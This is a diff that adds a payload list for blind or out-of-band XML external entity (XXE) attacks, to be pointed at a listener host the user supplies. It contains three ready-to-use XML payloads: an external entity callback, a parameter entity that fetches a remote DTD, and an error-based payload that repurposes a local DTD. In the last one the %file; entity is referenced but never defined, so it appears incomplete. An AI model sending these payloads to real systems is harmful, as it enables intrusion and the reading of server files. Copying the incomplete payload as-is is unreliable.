@@ -1,0 +1,27 @@
+# Blind / Out-of-Band (OOB) XXE Payloads
+# Replace 'YOUR_HOST' with your DNS/HTTP listener
+
+# Basic OOB DNS/HTTP Trigger
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://YOUR_HOST/a"> ]>
+<test>&xxe;</test>
+
+# Parameter Entity OOB (Triggers external DTD fetch)
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE test [
+  <!ENTITY % remote SYSTEM "http://YOUR_HOST/external.dtd">
+  %remote;
+]>
+<test>test</test>
+
+# Error-Based Blind XXE (Local DTD repurposing)
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE test [
+  <!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/iso-codes/iso_3166.dtd">
+  <!ENTITY % ISO3166 "
+    <!ENTITY &#x25; error SYSTEM 'file:///nonexistent/&#x25;file;'>
+    &#x25;error;
+  ">
+  %local_dtd;
+]>
+<test>test</test>
